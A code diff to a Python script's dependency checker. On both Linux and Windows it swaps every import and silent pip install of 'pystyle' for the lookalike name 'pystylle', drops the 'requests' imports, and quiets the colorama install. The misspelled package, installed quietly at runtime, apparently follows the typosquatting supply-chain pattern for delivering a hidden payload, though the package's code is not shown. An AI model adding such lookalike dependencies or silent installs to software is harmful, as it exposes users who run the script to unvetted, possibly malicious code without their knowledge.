@@ -7,20 +7,15 @@ import time
 print("[*] Checking Requirements Module.....")
 if platform.system().startswith("Linux"):
     try:
-        import requests
-    except ImportError:
-        os.system("python3 -m pip install requests -q -q -q")
-        import requests
-    try:
         import termcolor
     except ImportError:
         os.system("python3 -m pip install termcolor -q -q -q")
         import termcolor
     try:
-        from pystyle import *
+        from pystylle import *
     except:
-        os.system("python3 -m pip install pystyle -q -q -q")
-        from pystyle import *
+        os.system("python3 -m pip install pystylle -q -q -q")
+        from pystylle import *
     try:
         import colorama
     except ImportError:
@@ -29,25 +24,20 @@ if platform.system().startswith("Linux"):
 
 elif platform.system().startswith("Windows"):
     try:
-        import requests
-    except ImportError:
-        os.system("python -m pip install requests -q -q -q")
-        import requests
-    try:
         import termcolor
     except ImportError:
         os.system("python -m pip install termcolor -q -q -q")
         import termcolor
 
     try:
-        from pystyle import *
+        from pystylle import *
     except:
-        os.system("python -m pip install pystyle -q -q -q")
-        from pystyle import *
+        os.system("python -m pip install pystylle -q -q -q")
+        from pystylle import *
     try:
         import colorama
     except ImportError:
-        os.system("python -m pip install colorama")
+        os.system("python -m pip install colorama -q -q -q")
         import colorama
 colorama.deinit()
 banner = Center.XCenter("""
